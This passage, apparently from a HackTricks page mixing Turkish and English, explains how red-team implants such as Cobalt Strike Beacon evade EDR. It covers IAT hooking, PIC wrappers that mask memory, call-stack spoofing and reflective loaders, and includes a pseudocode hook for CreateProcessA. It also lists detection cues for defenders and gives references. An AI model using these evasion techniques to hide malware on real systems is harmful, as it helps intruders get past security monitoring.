- Her PIC wrapper, gerçek API adresine tail‑call yapmadan önce evasions uygular. Tipik evasions şunlardır:
  - Çağrı çevresinde bellek mask/unmask (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa isim/izinlerini değiştirme) ve çağrı sonrası eski haline getirme.
  - Call‑stack spoofing: zararsız bir stack inşa edip hedef API'ye geçiş yaparak call‑stack analizinin beklenen frame'lere işaret etmesini sağlama.
  - Uyumluluk için bir arayüz export edin, böylece bir Aggressor script (veya eşdeğeri) Beacon, BOFs ve post‑ex DLLs için hangi API'lerin hooklanacağını kaydedebilir.

Why IAT hooking here
- Hooklanan importu kullanan herhangi bir kod için çalışır; tool kodunu değiştirmeye veya belirli API'leri proxy etmesi için Beacon'a güvenmeye gerek kalmaz.
- post‑ex DLLs kapsamı: LoadLibrary*'ı hooklayarak modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalayabilir ve aynı masking/stack evasion'ı onların API çağrılarına uygulayabilirsiniz.
- CreateProcessA/W'i sararak call‑stack–tabanlı tespitlere karşı process‑spawning post‑ex komutlarının güvenilir kullanımını geri kazandırır.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yama'yı relocations/ASLR'dan sonra ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi reflective loaders, yüklenen modülün DllMain sırasında hooking yaptığını gösterir.
- Keep wrappers tiny and PIC-safe; gerçek API'yi yama uygulamadan önce yakaladığınız orijinal IAT değeri üzerinden veya LdrGetProcedureAddress ile çözün.
- PIC için RW → RX geçişlerini kullanın ve writable+executable sayfaları bırakmaktan kaçının.

Call‑stack spoofing stub
- Draugr‑style PIC stubs sahte bir çağrı zinciri (dönüş adresleri benign modüllere) oluşturur ve ardından gerçek API'ye pivot yapar.
- Bu, Beacon/BOFs'tan hassas API'lere kadar canonical stack'leri bekleyen tespitleri atlatır.
- API prologue'dan önce beklenen framelerin içine inmek için stack cutting/stack stitching teknikleriyle eşleştirin.

Operational integration
- Reflective loader'ı post‑ex DLL'lerin başına ekleyin; böylece DLL yüklendiğinde PIC ve hook'lar otomatik olarak inisyalize olur.
- Hedef API'leri kaydetmek için bir Aggressor script kullanın; böylece Beacon ve BOFs kod değişikliği olmadan aynı evasion yolundan transparan şekilde faydalanır.

Detection/DFIR considerations
- IAT integrity: non‑image (heap/anon) adreslerine çözülen girdiler; import pointers'ın periyodik doğrulanması.
- Stack anomalies: yüklü image'lara ait olmayan dönüş adresleri; non‑image PIC'e ani geçişler; tutarsız RtlUserThreadStart ata zinciri.
- Loader telemetry: proses içinde IAT'ye yazmalar, import thunks'larını değiştiren erken DllMain aktiviteleri, yükleme sırasında oluşturulan beklenmeyen RX region'lar.
- Image‑load evasion: LoadLibrary* hook'lanıyorsa, memory masking olaylarıyla korele olan automation/clr assembly'lerinin şüpheli yüklemelerini izleyin.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
